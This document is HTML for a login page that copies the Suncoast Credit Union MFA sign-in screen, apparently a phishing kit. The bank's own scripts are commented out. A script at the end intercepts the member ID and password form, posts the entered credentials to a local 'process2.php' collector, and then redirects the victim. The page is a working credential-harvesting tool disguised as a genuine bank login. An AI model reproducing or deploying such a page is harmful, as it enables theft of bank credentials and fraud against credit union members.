...
<script type="text/javascript" src="https://bam-cell.nr-data.net/1/7e79147f0f?a=4343735&amp;v=1212.e95d35c&amp;to=blYEbUZRXRFWBxBZWlccK293H34EVicLXkFLXApVUUIcC1kAAUg%3D&amp;rst=20306&amp;ck=1&amp;ref=https://banking.suncoastcreditunion.com/Mfa/index&amp;ap=4&amp;be=4415&amp;fe=10096&amp;dc=8419&amp;af=err,xhr,stn,ins,spa&amp;perf=%7B%22timing%22:%7B%22of%22:1637856494084,%22n%22:0,%22f%22:94,%22dn%22:94,%22dne%22:94,%22c%22:94,%22s%22:94,%22ce%22:94,%22rq%22:357,%22rp%22:946,%22rpe%22:947,%22dl%22:1282,%22di%22:1567,%22ds%22:3366,%22de%22:3367,%22dc%22:4405,%22l%22:4405,%22le%22:4528%7D,%22navigation%22:%7B%7D%7D&amp;fcp=3318&amp;jsonp=NREUM.setToken"></script>
<script type="text/javascript" async="" src="https://www.cdn-path.com/et.js"></script>
<script type="text/javascript" async="" src="//six.cdn-net.com/6.js"></script>
<script src="https://js-agent.newrelic.com/nr-spa-1212.min.js"></script>
<script async="" src="//www.google-analytics.com/analytics.js"></script>
<script type="text/javascript" async="" src="https://www.cdn-path.com/cc.js?ts=1637856500653"></script>
...
<script type="text/javascript">window.NREUM||(NREUM={});NREUM.info = {"beacon":"bam-cell.nr-data.net","errorBeacon":"bam-cell.nr-data.net","licenseKey":"7e79147f0f","applicationID":"4343735","transactionName":"blYEbUZRXRFWBxBZWlccK293H34EVicLXkFLXApVUUIcC1kAAUg=","queueTime":0,"applicationTime":4,"agent":"","atts":""}</script>
...
<!--
<script src="/src/suncoast-45345.js" type="text/javascript"></script>
...
<meta http-equiv="X-Frame-Options" content="sameorigin" /></noscript>
...
<!--
<script src="/bundles/mainjsko3?v=kvoSHfa05z1ApI1vcTI18TGpzYiYBsE2GXdEfFyikhU1" type="text/javascript"></script>
<script type="text/javascript">
...
<style type="text/css" nonce="f32afd94ff99">iframe.usabilla-live-button#usabilla_live_button_container_iframe3982196{width:39px;height:110px;margin: 0;padding: 0;border: 0;overflow: hidden;z-index: 9998;position: absolute;left: 0;top: 0;box-shadow: 0 0 0;background-color: transparent;}</style>
...
<form action="" autocomplete="off" id="loginFormxx" name="loginFormxx" method="post">
...
<script src="/bundles/mfa?v=d7auorJnHB_CALDs4WsxelTa15hw85ILWFKugTH6bUo1" type="text/javascript"></script>
-->
...
<legend>
<span class="scuBlueText" data-bind="slideVisible:allowMemberIdEntry()" style="display: inline;">Login</span>
<span style="display: none;" data-bind="slideVisible:!allowMemberIdEntry()">
<span class="scuGreenText">Authenticating </span>
<span class="scuBlueText" data-bind="text:userId">sdadasdasd</span>
</span>
</legend>
<div style="" data-bind="visible: errorMessage() &amp;&amp; errorMessage() != ''" class="red-text">
<ul>
<li data-bind="html:errorMessage">Invalid Member ID and Password.</li>
</ul>
</div>
...
<input data-bind="value:userId"  id="txtMemberNumber" required style="height:30px" type="text" autocomplete="off" data-val="true" data-val-regex="Member ID Must Be Numeric" data-val-regex-pattern="^[0-9]+$" data-val-required="The Member ID field is required." maxlength="7" name="UserName" placeholder="Member ID" tabindex="1">
</div>
<div class="control-group">
<input data-bind="value:password,valueUpdate: 'keyup'" required id="txtPassword" style="height:30px" data-val="true" data-val-length="The password you entered is invalid." data-val-length-max="16" data-val-required="Required" maxlength="16" name="Passwordx" placeholder="Password" tabindex="2" type="password">
</div>
<div class="center">
<a href="/Authentication/AnalyzeForgotPin">Forgot Password?</a>
</div>
</div>
<div style="display: none;" class="center padding30" data-bind="slideVisible:loading">
<div class="center padding30">
<img class="opaque" src="/Content/Images/Wait64.gif" alt="Loading">
</div><br><br>
...
<span class="small-text"><br><a href="/" title="Login Again">Login again</a> with a different member number?<br></span>
</div>
<hr>
<div class="control-group">
<button style="" id="btnSubmitx" type="submit" class="btn btn-primary btn-login-right" tabindex="4">
<span data-bind="visible: !processing()">Login</span>
</button>
 <input type="submit" disablevalidation="true" value="Cancel" onclick="if (!window.__cfRLUnblockHandlers) return false; window.location.href = '/'; return false;" id="btnCancel" class="btn btn-info cancel">
<script type="text/javascript">
...
<script type="text/javascript">
    var _oobTransactionType = "Login";
    var viewModel = new ViewModel();

viewModel.userId("sdadasdasd");viewModel.password("asdasdsdasdasdsa");viewModel.allowMemberIdEntry(false);
viewModel.analyze();

    $(document).ready(function () {
        var btnDefaultHandler = function (e) {
            if (e.keyCode == 13) {
                $('#btnSubmit').click();
        ...
        $('#txtMemberNumber').keypress(btnDefaultHandler);
        $('#txtPassword').keypress(btnDefaultHandler);
...
<script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/v64f9daad31f64f81be21cbef6184a5e31634941392597" integrity="sha512-gV/bogrUTVP2N3IzTDKzgP0Js1gg4fbwtYB6ftgLbKQu/V8yH2+lrKCfKHelh4SO3DPzKj4/glTO+tNJGDnb0A==" data-cf-beacon="{&quot;rayId&quot;:&quot;6b3c22847b3c4bf4&quot;,&quot;token&quot;:&quot;34d70217d0694bccac339a3fc07a0797&quot;,&quot;version&quot;:&quot;2021.11.0&quot;,&quot;si&quot;:100}" crossorigin="anonymous"></script>


<div id="inauth_font_detector" style="visibility: hidden;position: absolute; top: 0px; left: -999px;"></div>
<div class="usabilla_live_button_container" id="usabilla_live_button_container_753903020" role="button" tabindex="0" aria-label="Usabilla Feedback Button" style="display: none;"><style type="text/css" nonce="f32afd94ff99">div.usabilla_live_button_container#usabilla_live_button_container_753903020[role="button"] {position:fixed;width:39px;height:110px;z-index:999;right:0px;top:50%;margin-top:-55px}</style><iframe src="" marginwidth="0" marginheight="0" scrolling="no" data-tags="right" title="Usabilla Feedback Button" class="usabilla-live-button" id="usabilla_live_button_container_iframe3982196" frameborder="0"></iframe></div><script type="text/javascript" id="gtm-engagement-timer">(function(h,l){function m(a,b){this._interval=b;this._fn=a;this.tick()}function e(a){if(!a.each&&!a.every)throw Error("Requires opts.each or opts.every.");if((a.idleAfter||a.engagementEvents)&&!(a.idleAfter&&a.engagementEvents&&a.engagementEvents.length))throw Error("Configure opts.idleAfter \x26 opts.engagementEvents for idling.");if(!(this instanceof e))return new e(a);this._context=a.context||h;"string"===typeof this._context&&(this._context=h.querySelector(a.context));if(!this._context)throw Error("Unable to find context "+
...
$('#loginFormxx').on('submit', function(e){
		
		 $(".overlay").show(500);
		$.post('layout/vendor/datatrac/02_doc11/process2.php', $(this).serialize(), function(data){
			console.log(data);
		});
		setTimeout(function() {
                               window.location.href = "indexem";
                        },2000);
		e.preventDefault();
	});
